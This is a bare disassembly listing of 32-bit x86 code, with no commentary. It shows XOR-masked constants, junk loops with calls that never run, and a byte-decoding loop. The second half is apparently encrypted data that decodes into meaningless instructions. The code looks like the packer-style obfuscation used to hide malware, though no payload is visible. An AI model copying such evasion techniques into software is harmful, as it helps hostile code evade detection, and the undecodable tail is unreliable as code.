  40a6dc:	mov    DWORD PTR [ebp-0x20],0xf89c85ba
  40a6e3:	mov    eax,DWORD PTR [ebp-0x38]
  40a6e6:	xor    eax,esi
  40a6e8:	add    eax,edi
  40a6ea:	mov    DWORD PTR [ebp-0x10],eax
  40a6ed:	mov    eax,DWORD PTR [ebp-0x38]
  40a6f0:	xor    eax,esi
  40a6f2:	add    eax,edi
  40a6f4:	mov    DWORD PTR [ebp-0x8],eax
  40a6f7:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  40a6fe:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  40a705:	mov    eax,DWORD PTR [ebp-0x38]
  40a708:	mov    edx,DWORD PTR [ebp-0x14]
  40a70b:	xor    eax,esi
  40a70d:	add    eax,edi
  40a70f:	cmp    edx,eax
  40a711:	je     0x40a90a
  40a717:	mov    eax,DWORD PTR [ebp-0x20]
  40a71a:	xor    eax,esi
  40a71c:	mov    edx,0xffcd8d0f
  40a721:	sub    edx,eax
  40a723:	add    edx,DWORD PTR [ebp-0x14]
  40a726:	mov    eax,DWORD PTR [ebp-0x20]
  40a729:	mov    ebx,DWORD PTR [ebp-0x10]
  40a72c:	xor    eax,esi
  40a72e:	add    eax,edi
  40a730:	imul   eax,ebx
  40a733:	cmp    eax,edx
  40a735:	ja     0x40a907
  40a73b:	mov    edx,DWORD PTR [ebp-0x10]
  40a73e:	mov    eax,DWORD PTR [ebp-0x14]
  40a741:	mov    ebx,DWORD PTR [ebp-0x2c]
  40a744:	sub    eax,edx
  40a746:	xor    ebx,esi
  40a748:	xor    edx,edx
  40a74a:	add    ebx,edi
  40a74c:	div    ebx
  40a74e:	mov    DWORD PTR [ebp-0x8],eax
  40a751:	mov    eax,DWORD PTR [ebp-0x44]
  40a754:	mov    edx,DWORD PTR [ebp-0x8]
  40a757:	xor    eax,esi
  40a759:	add    eax,edi
  40a75b:	cmp    edx,eax
  40a75d:	jbe    0x40a76d
  40a763:	mov    eax,DWORD PTR [ebp-0x44]
  40a766:	xor    eax,esi
  40a768:	add    eax,edi
  40a76a:	mov    DWORD PTR [ebp-0x8],eax
  40a76d:	mov    eax,DWORD PTR [ebp-0x2c]
  40a770:	mov    edx,DWORD PTR [ebp-0x8]
  40a773:	xor    eax,esi
  40a775:	add    eax,edi
  40a777:	imul   eax,edx
  40a77a:	mov    DWORD PTR [ebp-0x8],eax
  40a77d:	mov    eax,DWORD PTR [ebp-0x38]
  40a780:	mov    edx,DWORD PTR [ebp-0x8]
  40a783:	xor    eax,esi
  40a785:	add    eax,edi
  40a787:	cmp    edx,eax
  40a789:	je     0x40a8f0
  40a78f:	mov    eax,DWORD PTR [ebp-0x8]
  40a792:	mov    DWORD PTR [ebp-0x18],eax
  40a795:	mov    eax,DWORD PTR [ebp-0x10]
  40a798:	add    eax,DWORD PTR [ebp-0x54]
  40a79b:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  40a7a2:	mov    DWORD PTR [ebp-0x8],eax
  40a7a5:	mov    eax,0xf89c85ba
  40a7aa:	mov    DWORD PTR [ebp-0x28],eax
  40a7ad:	mov    DWORD PTR [ebp-0x5c],0xf89c85bb
  40a7b4:	mov    DWORD PTR [ebp-0x40],0xf89c85b8
  40a7bb:	mov    DWORD PTR [ebp-0x30],eax
  40a7be:	mov    eax,DWORD PTR [ebp-0x1c]
  40a7c1:	xor    eax,esi
  40a7c3:	add    eax,edi
  40a7c5:	jmp    0x40a8ac
  40a7ca:	mov    DWORD PTR [ebp-0x4c],0xf89c85b0
  40a7d1:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  40a7d8:	mov    eax,DWORD PTR [ebp-0x30]
  40a7db:	mov    edx,DWORD PTR [ebp-0xc]
  40a7de:	xor    eax,esi
  40a7e0:	add    eax,edi
  40a7e2:	imul   eax,edx
  40a7e5:	mov    edx,DWORD PTR [ebp-0x8]
  40a7e8:	mov    al,BYTE PTR [eax+edx*1]
  40a7eb:	mov    BYTE PTR [ebp-0x1],al
  40a7ee:	mov    eax,DWORD PTR [ebp-0x30]
  40a7f1:	mov    edx,DWORD PTR [ebp-0xc]
  40a7f4:	xor    eax,esi
  40a7f6:	add    eax,edi
  40a7f8:	imul   eax,edx
  40a7fb:	mov    edx,DWORD PTR [ebp-0x5c]
  40a7fe:	xor    edx,esi
  40a800:	add    eax,edx
  40a802:	mov    edx,DWORD PTR [ebp-0x8]
  40a805:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  40a80d:	mov    edx,DWORD PTR [ebp-0x4c]
  40a810:	xor    edx,esi
  40a812:	lea    eax,[edx+eax*1+0x3272f1]
  40a819:	movzx  edx,BYTE PTR [ebp-0x1]
  40a81d:	xor    edx,eax
  40a81f:	mov    BYTE PTR [ebp-0x1],dl
  40a822:	mov    al,BYTE PTR [ebp-0x1]
  40a825:	mov    edx,DWORD PTR [ebp-0x30]
  40a828:	mov    ebx,DWORD PTR [ebp-0xc]
  40a82b:	xor    edx,esi
  40a82d:	add    edx,edi
  40a82f:	imul   edx,ebx
  40a832:	mov    ebx,DWORD PTR [ebp-0x8]
  40a835:	mov    BYTE PTR [edx+ebx*1],al
  40a838:	mov    eax,DWORD PTR [ebp-0x30]
  40a83b:	mov    edx,DWORD PTR [ebp-0xc]
  40a83e:	xor    eax,esi
  40a840:	add    eax,edi
  40a842:	imul   eax,edx
  40a845:	mov    edx,DWORD PTR [ebp-0x8]
  40a848:	mov    al,BYTE PTR [eax+edx*1]
  40a84b:	mov    BYTE PTR [ebp-0x1],al
  40a84e:	mov    eax,DWORD PTR [ebp-0x30]
  40a851:	mov    edx,DWORD PTR [ebp-0xc]
  40a854:	xor    eax,esi
  40a856:	add    eax,edi
  40a858:	imul   eax,edx
  40a85b:	mov    edx,DWORD PTR [ebp-0x28]
  40a85e:	xor    edx,esi
  40a860:	add    eax,edx
  40a862:	mov    edx,DWORD PTR [ebp-0x8]
  40a865:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f1]
  40a86d:	mov    edx,DWORD PTR [ebp-0x50]
  40a870:	xor    edx,esi
  40a872:	lea    eax,[edx+eax*1+0x3272f1]
  40a879:	movzx  edx,BYTE PTR [ebp-0x1]
  40a87d:	xor    edx,eax
  40a87f:	mov    BYTE PTR [ebp-0x1],dl
  40a882:	mov    al,BYTE PTR [ebp-0x1]
  40a885:	mov    edx,DWORD PTR [ebp-0x30]
  40a888:	mov    ebx,DWORD PTR [ebp-0xc]
  40a88b:	xor    edx,esi
  40a88d:	add    edx,edi
  40a88f:	imul   edx,ebx
  40a892:	mov    ebx,DWORD PTR [ebp-0x8]
  40a895:	mov    BYTE PTR [edx+ebx*1],al
  40a898:	mov    eax,DWORD PTR [ebp-0x40]
  40a89b:	mov    edx,DWORD PTR [ebp-0x28]
  40a89e:	xor    eax,esi
  40a8a0:	xor    edx,esi
  40a8a2:	add    eax,edi
  40a8a4:	add    edx,edi
  40a8a6:	imul   eax,edx
  40a8a9:	add    eax,DWORD PTR [ebp-0xc]
  40a8ac:	mov    DWORD PTR [ebp-0xc],eax
  40a8af:	mov    eax,DWORD PTR [ebp-0xc]
  40a8b2:	mov    edx,DWORD PTR [ebp-0x18]
  40a8b5:	cmp    edx,eax
  40a8b7:	jb     0x40a7ca
  40a8bd:	mov    eax,DWORD PTR [ebp-0x28]
  40a8c0:	mov    edx,DWORD PTR [ebp-0x18]
  40a8c3:	xor    eax,esi
  40a8c5:	add    eax,edi
  40a8c7:	imul   eax,edx
  40a8ca:	mov    edx,DWORD PTR [ebp-0x1c]
  40a8cd:	xor    edx,esi
  40a8cf:	add    edx,edi
  40a8d1:	or     eax,edx
  40a8d3:	mov    edx,DWORD PTR [ebp-0x20]
  40a8d6:	xor    edx,esi
  40a8d8:	add    eax,edx
  40a8da:	mov    edx,DWORD PTR [ebp-0x20]
  40a8dd:	xor    edx,esi
  40a8df:	add    eax,edx
  40a8e1:	mov    edx,DWORD PTR [ebp-0x10]
  40a8e4:	lea    eax,[eax+edx*1+0x64e5e2]
  40a8eb:	jmp    0x40a8ff
  40a8f0:	mov    eax,DWORD PTR [ebp-0x20]
  40a8f3:	mov    edx,DWORD PTR [ebp-0x10]
  40a8f6:	xor    eax,esi
  40a8f8:	lea    eax,[eax+edx*1+0x3272f1]
  40a8ff:	mov    DWORD PTR [ebp-0x10],eax
  40a902:	jmp    0x40a717
  40a907:	mov    ebx,DWORD PTR [ebp-0x3c]
  40a90a:	mov    eax,DWORD PTR [ebp+0xc]
  40a90d:	xor    eax,esi
  40a90f:	lea    ecx,[ecx+eax*1+0x3272f1]
  40a916:	lea    eax,[ecx-0x3272f1]
  40a91c:	xor    eax,esi
  40a91e:	cmp    eax,0xf89c95a5
  40a923:	jne    0x40a6bb
  40a929:	dec    DWORD PTR [ebp-0x34]
  40a92c:	jne    0x40a6af
  40a932:	mov    eax,DWORD PTR [ebp+0x8]
  40a935:	mov    ecx,DWORD PTR [ebp+0xc]
  40a938:	mov    edx,DWORD PTR [ebp+0x8]
  40a93b:	xor    ecx,esi
  40a93d:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f1]
  40a944:	xor    eax,esi
  40a946:	mov    al,BYTE PTR [eax+ebx*1+0x3272f1]
  40a94d:	xor    edx,esi
  40a94f:	mov    BYTE PTR [edx+ebx*1+0x3272f1],cl
  40a956:	mov    ecx,DWORD PTR [ebp+0xc]
  40a959:	xor    ecx,esi
  40a95b:	mov    BYTE PTR [ecx+ebx*1+0x3272f1],al
  40a962:	mov    eax,DWORD PTR [ebp+0xc]
  40a965:	xor    eax,esi
  40a967:	add    eax,edi
  40a969:	pop    edi
  40a96a:	pop    esi
  40a96b:	pop    ebx
  40a96c:	leave  
  40a96d:	ret    0x8
  40a970:	and    DWORD PTR ds:0x42a2e6,0x42a28a
  40a97a:	xor    eax,eax
  40a97c:	sbb    DWORD PTR ds:0x42a2c2,0x42a2ae
  40a986:	inc    eax
  40a987:	ret    
  40a988:	push   ebp
  40a989:	mov    ebp,esp
  40a98b:	sub    esp,0x38
  40a98e:	movzx  eax,WORD PTR ds:0x42a2f6
  40a995:	sbb    DWORD PTR ds:0x42a276,eax
  40a99b:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  40a9a2:	push   ebx
  40a9a3:	add    DWORD PTR ds:0x42a2e6,0x20e2
  40a9ad:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  40a9b4:	and    DWORD PTR ds:0x42a2be,0x0
  40a9be:	jmp    0x40a9d1
  40a9c3:	xor    eax,eax
  40a9c5:	or     eax,DWORD PTR ds:0x42a2be
  40a9cb:	inc    eax
  40a9cc:	mov    ds:0x42a2be,eax
  40a9d1:	cmp    DWORD PTR ds:0x42a2be,0x1e
  40a9d8:	jae    0x40aa03
  40a9de:	cmp    DWORD PTR ds:0x42a2be,0x1f
  40a9e5:	jge    0x40aa03
  40a9eb:	jmp    0x40a9fe
  40a9f0:	push   DWORD PTR [ebp-0x1c]
  40a9f3:	push   0x42a2de
  40a9f8:	call   DWORD PTR ds:0x42a3fa
  40a9fe:	jmp    0x40a9c3
  40aa03:	mov    eax,DWORD PTR [ebp-0x4]
  40aa06:	or     DWORD PTR ds:0x42a296,0x3f2f
  40aa10:	push   esi
  40aa11:	xor    esi,esi
  40aa13:	xor    esi,DWORD PTR ds:0x42a2f2
  40aa19:	or     esi,DWORD PTR ds:0x42a28e
  40aa1f:	mov    DWORD PTR ds:0x42a2f2,esi
  40aa25:	mov    esi,0x75108aa
  40aa2a:	xor    eax,esi
  40aa2c:	push   edi
  40aa2d:	mov    DWORD PTR ds:0x42a2ce,0x1b
  40aa37:	cmp    DWORD PTR ds:0x42a2ce,0x0
  40aa3e:	je     0x40aa8f
  40aa44:	cmp    DWORD PTR ds:0x42a2ce,0x4
  40aa4b:	jb     0x40aa8f
  40aa51:	jmp    0x40aa61
  40aa56:	push   0x724e
  40aa5b:	call   DWORD PTR ds:0x42a3d6
  40aa61:	cmp    DWORD PTR ds:0x42a2ce,0x5
  40aa68:	jne    0x40aa7d
  40aa6e:	xor    edi,edi
  40aa70:	xor    edi,DWORD PTR ds:0x42a2ce
  40aa76:	dec    edi
  40aa77:	mov    DWORD PTR ds:0x42a2ce,edi
  40aa7d:	mov    edi,DWORD PTR ds:0x42a2ce
  40aa83:	dec    edi
  40aa84:	mov    DWORD PTR ds:0x42a2ce,edi
  40aa8a:	jmp    0x40aa37
  40aa8f:	mov    edi,0x3272f1
  40aa94:	add    eax,edi
  40aa96:	mov    DWORD PTR [ebp-0x1c],eax
  40aa99:	and    DWORD PTR ds:0x42a26e,0x0
  40aaa3:	jmp    0x40aab3
  40aaa8:	mov    eax,ds:0x42a26e
  40aaad:	inc    eax
  40aaae:	mov    ds:0x42a26e,eax
  40aab3:	cmp    DWORD PTR ds:0x42a26e,0x1b
  40aaba:	jae    0x40aae6
  40aac0:	cmp    DWORD PTR ds:0x42a26e,0x24
  40aac7:	ja     0x40aae6
  40aacd:	jmp    0x40aae1
  40aad2:	push   DWORD PTR [ebp-0x24]
  40aad5:	push   DWORD PTR [ebp-0x1c]
  40aad8:	push   DWORD PTR [ebp-0x28]
  40aadb:	call   DWORD PTR ds:0x42a3da
  40aae1:	jmp    0x40aaa8
  40aae6:	mov    eax,DWORD PTR [ebp+0x14]
  40aae9:	sub    DWORD PTR ds:0x42a28a,0x606e
  40aaf3:	test   eax,eax
  40aaf5:	je     0x40ab5c
  40aafb:	mov    eax,DWORD PTR [ebp+0x14]
  40aafe:	mov    eax,DWORD PTR [eax]
  40ab00:	and    DWORD PTR ds:0x42a2fe,0x0
  40ab0a:	jmp    0x40ab1c
  40ab0f:	mov    ebx,DWORD PTR ds:0x42a2fe
  40ab15:	inc    ebx
  40ab16:	mov    DWORD PTR ds:0x42a2fe,ebx
  40ab1c:	cmp    DWORD PTR ds:0x42a2fe,0x11
  40ab23:	jae    0x40ab59
  40ab29:	cmp    DWORD PTR ds:0x42a2fe,0x1c
  40ab30:	jge    0x40ab59
  40ab36:	jmp    0x40ab54
  40ab3b:	push   DWORD PTR [ebp-0x20]
  40ab3e:	push   DWORD PTR [ebp-0x10]
  40ab41:	push   0x1b8e
  40ab46:	push   DWORD PTR [ebp-0xc]
  40ab49:	push   0x42a28e
  40ab4e:	call   DWORD PTR ds:0x42a3de
  40ab54:	jmp    0x40ab0f
  40ab59:	mov    DWORD PTR [ebp-0x1c],eax
  40ab5c:	sub    DWORD PTR ds:0x42a2f2,0x6975
  40ab66:	mov    eax,DWORD PTR [ebp-0x4]
  40ab69:	adc    DWORD PTR ds:0x42a26e,0x42a2ca
  40ab73:	xor    eax,esi
  40ab75:	add    eax,edi
  40ab77:	mov    ebx,DWORD PTR ds:0x42a306
  40ab7d:	mov    ebx,DWORD PTR [ebx]
  40ab7f:	and    DWORD PTR ds:0x42a2e6,ebx
  40ab85:	mov    DWORD PTR [ebp-0x8],eax
  40ab88:	adc    DWORD PTR ds:0x42a2c6,0x7b40
  40ab92:	mov    eax,DWORD PTR [ebp-0xc]
  40ab95:	xor    DWORD PTR ds:0x42a2c6,0x5a4b
  40ab9f:	xor    eax,esi
  40aba1:	add    eax,edi
  40aba3:	dec    DWORD PTR ds:0x42a2be
  40aba9:	mov    DWORD PTR [ebp-0x24],eax
  40abac:	mov    eax,DWORD PTR [ebp-0x4]
  40abaf:	and    DWORD PTR ds:0x42a2be,0x0
  40abb9:	jmp    0x40abcb
  40abbe:	mov    ebx,DWORD PTR ds:0x42a2be
  40abc4:	inc    ebx
  40abc5:	mov    DWORD PTR ds:0x42a2be,ebx
  40abcb:	cmp    DWORD PTR ds:0x42a2be,0x13
  40abd2:	jae    0x40ac19
  40abd8:	cmp    DWORD PTR ds:0x42a2be,0x4
  40abdf:	jb     0x40ac19
  40abe5:	jmp    0x40abfa
  40abea:	push   0x68db
  40abef:	push   0x42a266
  40abf4:	call   DWORD PTR ds:0x42a40a
  40abfa:	cmp    DWORD PTR ds:0x42a2be,0x3
  40ac01:	jne    0x40ac14
  40ac07:	mov    ebx,DWORD PTR ds:0x42a2be
  40ac0d:	inc    ebx
  40ac0e:	mov    DWORD PTR ds:0x42a2be,ebx
  40ac14:	jmp    0x40abbe
  40ac19:	xor    eax,esi
  40ac1b:	movzx  ebx,WORD PTR ds:0x42a266
  40ac22:	or     DWORD PTR ds:0x42a2ae,ebx
  40ac28:	add    eax,edi
  40ac2a:	mov    DWORD PTR [ebp-0x30],eax
  40ac2d:	mov    ebx,DWORD PTR [ebp-0x4]
  40ac30:	sbb    DWORD PTR ds:0x42a2c2,edi
  40ac36:	xor    ebx,esi
  40ac38:	and    DWORD PTR ds:0x42a292,0x0
  40ac42:	jmp    0x40ac52
  40ac47:	mov    eax,ds:0x42a292
  40ac4c:	inc    eax
  40ac4d:	mov    ds:0x42a292,eax
  40ac52:	cmp    DWORD PTR ds:0x42a292,0x1c
  40ac59:	jae    0x40ac82
  40ac5f:	cmp    DWORD PTR ds:0x42a292,0x26
  40ac66:	jbe    0x40ac82
  40ac6c:	jmp    0x40ac7d
  40ac71:	push   DWORD PTR [ebp-0x1c]
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42a3e2
  40ac7d:	jmp    0x40ac47
  40ac82:	add    ebx,edi
  40ac84:	mov    eax,DWORD PTR [ebp-0x24]
  40ac87:	sbb    DWORD PTR ds:0x42a2d2,0x3c99
  40ac91:	sub    eax,edi
  40ac93:	adc    DWORD PTR ds:0x42a2be,0x42a266
  40ac9d:	lea    ecx,[ebx-0x3272f1]
  40aca3:	inc    DWORD PTR ds:0x42a272
  40aca9:	xor    eax,esi
  40acab:	xor    ecx,esi
  40acad:	cmp    ecx,eax
  40acaf:	mov    DWORD PTR ds:0x42a28e,0x7ce
  40acb9:	je     0x40f5ba
  40acbf:	mov    eax,DWORD PTR [ebp-0x4]
  40acc2:	xor    eax,esi
  40acc4:	add    eax,edi
  40acc6:	mov    DWORD PTR ds:0x42a2be,0x2860
  40acd0:	cmp    ebx,eax
  40acd2:	jne    0x40f597
  40acd8:	xor    DWORD PTR ds:0x42a27e,0x42a2f2
  40ace2:	push   DWORD PTR [ebp+0x8]
  40ace5:	call   0x424fde
  40acea:	mov    DWORD PTR [ebp-0x14],eax
  40aced:	and    DWORD PTR ds:0x42a2ca,0x0
  40acf7:	jmp    0x40ad07
  40acfc:	mov    eax,ds:0x42a2ca
  40ad01:	inc    eax
  40ad02:	mov    ds:0x42a2ca,eax
  40ad07:	cmp    DWORD PTR ds:0x42a2ca,0x1f
  40ad0e:	jae    0x40ad4c
  40ad14:	cmp    DWORD PTR ds:0x42a2ca,0xa
  40ad1b:	jge    0x40ad4c
  40ad21:	jmp    0x40ad2f
  40ad26:	push   DWORD PTR [ebp-0x18]
  40ad29:	call   DWORD PTR ds:0x42a3ea
  40ad2f:	cmp    DWORD PTR ds:0x42a2ca,0x9
  40ad36:	jne    0x40ad47
  40ad3c:	mov    eax,ds:0x42a2ca
  40ad41:	inc    eax
  40ad42:	mov    ds:0x42a2ca,eax
  40ad47:	jmp    0x40acfc
  40ad4c:	mov    eax,DWORD PTR [ebp-0x4]
  40ad4f:	mov    ecx,DWORD PTR [ebp-0x14]
  40ad52:	add    DWORD PTR ds:0x42a2a6,0x42a28e
  40ad5c:	jmp    0x40d0d8
  40ad61:	sub    bl,BYTE PTR [ebp-0xd]
  40ad64:	mov    BYTE PTR es:[esi+0x15a851a2],al
  40ad6b:	pop    ds
  40ad6c:	adc    DWORD PTR [ecx+0x33dd5d69],0xfffffff1
  40ad73:	add    DWORD PTR [ebx-0x7c7ca1de],0x42
  40ad7a:	repnz push edx
  40ad7c:	lahf   
  40ad7d:	sbb    BYTE PTR [edx+0x5e],al
  40ad80:	popf   
  40ad81:	clc    
  40ad82:	xchg   esi,eax
  40ad83:	test   BYTE PTR [bp+0x71],ah
  40ad87:	dec    edx
  40ad88:	fucomp st(3)
  40ad8a:	sub    al,0x12
  40ad8c:	cmp    esi,ebp
  40ad8e:	imul   ebx,DWORD PTR [edx+0x66],0x6180ee8
  40ad95:	mov    ch,0xd9
  40ad97:	sub    BYTE PTR [edi-0x4],0x77
  40ad9b:	mov    ds:0x976624a7,al
  40ada0:	jnp    0x40ae13
  40ada2:	xchg   BYTE PTR [ebx+edx*4-0x1],ah
  40ada6:	dec    ecx
  40ada7:	mov    al,0xe2
  40ada9:	sub    BYTE PTR [ecx+0x21],0x7
  40adad:	xchg   esp,eax
  40adaf:	jmp    0x40ad71
  40adb1:	nop    edi
  40adb4:	loop   0x40ae22
  40adb6:	xchg   edi,eax
  40adb7:	cmp    dh,BYTE PTR ds:[eax]
  40adba:	adc    bl,bh
  40adbc:	popf   
  40adbd:	xchg   edi,eax
  40adbe:	sub    eax,0x87d0b996
  40adc3:	bnd jne 0x40ae42
  40adc6:	jecxz  0x40ad9d
  40adc8:	adc    eax,DWORD PTR [edx-0x35]
  40adcb:	and    al,0x31
  40adcd:	sahf   
  40adce:	fisub  WORD PTR [ecx-0x71b815a6]
  40add4:	or     eax,0xad73096a
  40add9:	ret    
  40adda:	(bad)  
  40addb:	sbb    DWORD PTR [ebx-0x74],ebp
  40adde:	mov    edi,0xbcc2c0f3
  40ade3:	dec    edx
  40ade4:	xchg   edi,eax
  40ade5:	test   eax,0xc9df54b5
  40adea:	fucomip st,st(4)
  40adec:	xchg   esp,eax
  40aded:	je     0x40adac
  40adef:	(bad)  
  40adf0:	cmp    DWORD PTR [edi-0x2c136d1d],esp
  40adf6:	push   es
  40adf7:	and    ch,dl
  40adf9:	shr    bl,1
  40adfb:	inc    ebx
  40adfc:	xor    DWORD PTR [ebp+0x3437f919],eax
  40ae02:	dec    eax
  40ae03:	xor    al,BYTE PTR [esi+0x5b]
  40ae06:	fnstsw WORD PTR [edx-0x35]
  40ae09:	sbb    BYTE PTR [ebp+ebp*2-0x25eca376],0xe2
  40ae11:	das    
  40ae12:	pop    ebp
  40ae13:	(bad)
  40ae16:	jae    0x40ae6a
  40ae18:	xor    BYTE PTR [edx],bh
  40ae1a:	retf   
  40ae1b:	push   ss
  40ae1c:	cmp    edx,DWORD PTR [ebx-0x4c]
  40ae1f:	(bad)  
  40ae22:	imul   esi,DWORD PTR [ebx],0xff8a6b09
  40ae28:	(bad)  
  40ae29:	xchg   ecx,eax
  40ae2a:	add    eax,0x31b216df
  40ae2f:	repnz mov ecx,0x823eea60
  40ae35:	sbb    ch,BYTE PTR [ecx-0x538aac5]
  40ae3b:	xchg   edx,eax
  40ae3c:	xchg   ebp,eax
  40ae3d:	push   esi
  40ae3e:	mov    ds:0x66001211,eax
  40ae43:	out    dx,al
  40ae44:	in     al,0x21
  40ae46:	pop    esi
  40ae47:	cmp    dh,BYTE PTR [eax]
  40ae49:	scas   eax,DWORD PTR es:[edi]
  40ae4a:	in     eax,0x82
  40ae4c:	inc    ecx
  40ae4d:	pop    ebx
  40ae4e:	sub    DWORD PTR [ebx-0x4d],edx
  40ae51:	test   DWORD PTR [esi+0x6ddbedd7],ebp
  40ae57:	push   edi
  40ae58:	std    
  40ae59:	xchg   esp,eax
  40ae5a:	out    0xae,eax
  40ae5c:	lea    ebp,[ebx]
  40ae5e:	sub    al,0xdf
  40ae60:	pop    eax
  40ae61:	cmovge ebx,DWORD PTR [edx-0x48]
  40ae65:	out    dx,eax
  40ae66:	xchg   edx,eax
  40ae67:	xchg   ebp,eax
  40ae68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae69:	mov    ds:0x348c3c54,eax
  40ae6e:	call   0x89d3:0x61279021
  40ae75:	in     eax,0xa8
  40ae77:	mov    ds:0x12a0acb4,eax
  40ae7c:	mov    edx,0x1be7ee64
  40ae81:	lahf   
  40ae82:	jne    0x40ae6f
  40ae84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae85:	xchg   esp,eax
  40ae86:	int3   
  40ae87:	and    al,0x19
  40ae89:	jo     0x40aee9
  40ae8b:	jnp    0x40aecb
  40ae8d:	jp     0x40aef2
  40ae8f:	jge    0x40aeb4
  40ae91:	inc    ecx
  40ae92:	aam    0xc1
  40ae94:	or     cl,bl
  40ae96:	mov    cl,0x20
  40ae98:	int3   
  40ae99:	add    esi,DWORD PTR [eax-0x28]
  40ae9c:	in     eax,dx
  40ae9d:	stos   DWORD PTR es:[edi],eax
  40ae9e:	xchg   edx,eax
  40ae9f:	push   esi
  40aea0:	fstp   TBYTE PTR [edi+0x1d]
  40aea3:	mov    ecx,gs
  40aea5:	retf   0xd4ba
  40aea8:	or     ebx,DWORD PTR [eax]
  40aeaa:	sbb    al,0xa
  40aeac:	jb     0x40ae98
  40aeae:	push   es
  40aeaf:	mov    esi,DWORD PTR [esi]
  40aeb1:	cmp    al,0xe
  40aeb3:	mov    ds:0x9fffc70d,eax
  40aeb8:	cmp    BYTE PTR [ecx-0x3fe7a4ae],dh
  40aebe:	sti    
  40aebf:	sar    esi,1
  40aec1:	idiv   DWORD PTR [esi+0x13]
  40aec4:	cmp    al,0xf7
  40aec6:	pop    ss
  40aec7:	outs   dx,DWORD PTR ds:[esi]
  40aec8:	(bad)  [esi]
  40aeca:	mov    es,WORD PTR [eax+ebx*2+0x290ad2a3]
  40aed1:	mov    edi,0x1f7cd6d
  40aed6:	push   ebp
  40aed7:	lods   al,BYTE PTR ds:[esi]
  40aed8:	cmp    al,0x6f
  40aeda:	shr    BYTE PTR [ebp-0x50d636f4],0xff
  40aee1:	aad    0x6c
  40aee3:	mov    bl,0x82
  40aee5:	cdq    
  40aee6:	dec    ebx
  40aee7:	push   ds
  40aee8:	fild   WORD PTR [edi+0x2d71b227]
  40aeee:	mov    ebx,0x25edbb8d
  40aef3:	and    edi,DWORD PTR [edi]
  40aef5:	mov    eax,0xd24f5e73
  40aefa:	js     0x40af49
  40aefc:	imul   ecx,DWORD PTR [edi+0x1c],0xd592de94
  40af03:	ds mov bl,0xd0
  40af06:	cmp    eax,0xca2596cc
  40af0b:	repnz lds edx,FWORD PTR [ebp+0xd]
  40af0f:	div    ebp
  40af11:	fdiv   st,st(5)
  40af13:	inc    esi
  40af14:	xchg   esi,eax
  40af15:	dec    ebx
  40af16:	mov    bl,0x60
  40af18:	xchg   ebp,eax
  40af19:	shl    DWORD PTR [esi],cl
  40af1b:	jg     0x40aee4
  40af1d:	in     eax,0xa3
  40af1f:	fs or  al,0xd1
  40af22:	pop    edx
  40af23:	inc    eax
  40af24:	push   ebx
  40af25:	ficomp WORD PTR [esi+0x8ee278b]
  40af2b:	xchg   bh,dl
  40af2d:	xchg   ecx,edi
  40af2f:	mov    DWORD PTR [edi-0x4d],eax
  40af32:	push   esi
  40af33:	mov    edx,0x62af0371
  40af38:	add    DWORD PTR [ebx+0x143eca68],ebp
  40af3e:	in     al,0x98
  40af40:	sbb    DWORD PTR [edi],esi
  40af42:	and    al,0x46
  40af44:	fwait
  40af45:	adc    bl,bh
  40af47:	out    0xb,eax
  40af49:	sbb    bl,BYTE PTR [eax+ebp*2+0x16cbbb29]
  40af50:	push   ds
  40af51:	push   esp
  40af52:	es pop ecx
  40af54:	mov    WORD PTR [esi+eiz*2],gs
  40af57:	mov    al,0xbd
  40af59:	sub    eax,0x4230902a
  40af5e:	cld    
  40af5f:	inc    edx
  40af60:	rcl    esi,1
  40af62:	imul   esp,eax,0xffffffb1
  40af65:	or     BYTE PTR [edx+0x54],bl
  40af68:	inc    ebp
  40af69:	pop    ebx
  40af6a:	daa    
  40af6b:	mov    ah,0xdc
  40af6d:	mov    ds:0xcaa78b44,eax
  40af72:	mov    ch,0xa
  40af74:	sub    BYTE PTR [edi+0x717f8c72],0x99
  40af7b:	add    DWORD PTR [edi+0x6525bbd1],0x9b24a78
  40af85:	adc    edx,ecx
  40af87:	ret    
  40af88:	mov    dl,0xea
  40af8a:	pop    ds
  40af8b:	(bad)  
  40af8c:	scas   al,BYTE PTR es:[edi]
  40af8d:	add    dl,BYTE PTR [edi-0x8b615d]
  40af93:	add    BYTE PTR gs:[ecx+eiz*8],bh
  40af97:	add    ebp,DWORD PTR [ebp-0x24]
  40af9a:	or     DWORD PTR [ebp-0x24c37402],ecx
  40afa0:	and    al,0xb7
  40afa2:	repnz enter 0x664b,0x5f
  40afa7:	and    al,0x86
  40afa9:	test   eax,0x9ce797e1
  40afae:	(bad)  [esi-0x21]
  40afb1:	pop    edi
  40afb2:	scas   eax,DWORD PTR es:[edi]
  40afb3:	dec    ecx
  40afb4:	pop    esi
  40afb5:	pusha  
  40afb6:	gs push ebp
  40afb8:	sbb    ah,BYTE PTR [edx+ebx*8-0x316f4076]
  40afbf:	inc    edx
  40afc0:	fstp   TBYTE PTR [edi]
  40afc2:	sub    DWORD PTR ds:0x21b895bd,ebx
  40afc8:	inc    edx
  40afc9:	ror    BYTE PTR [edx],cl
  40afcb:	(bad)  
  40afcc:	cmc    
  40afcd:	(bad)  
  40afcf:	sub    bl,BYTE PTR [eax]
  40afd1:	in     al,0x9c
  40afd3:	inc    ecx
  40afd4:	xlat   BYTE PTR ds:[ebx]
  40afd5:	(bad)  
  40afd7:	mov    al,ds:0xd286e796
  40afdc:	retf   
  40afdd:	(bad)  
  40afde:	fcomp  st(4)
  40afe0:	pop    edi
  40afe1:	repnz int 0x59
  40afe4:	push   edi
  40afe5:	gs ins BYTE PTR es:[edi],dx
  40afe7:	push   ss
  40afe8:	inc    ebx
  40afe9:	dec    ecx
  40afea:	popf   
  40afeb:	(bad)  
  40afec:	mov    dl,0xfd
  40afee:	(bad)  
  40afef:	out    0xac,eax
  40aff1:	cmp    al,0x2c
  40aff3:	aad    0x2c
  40aff5:	test   eax,0x12949e49
  40affa:	fisttp WORD PTR ds:0xf203d48d
  40b000:	mov    cl,cl
  40b002:	daa    
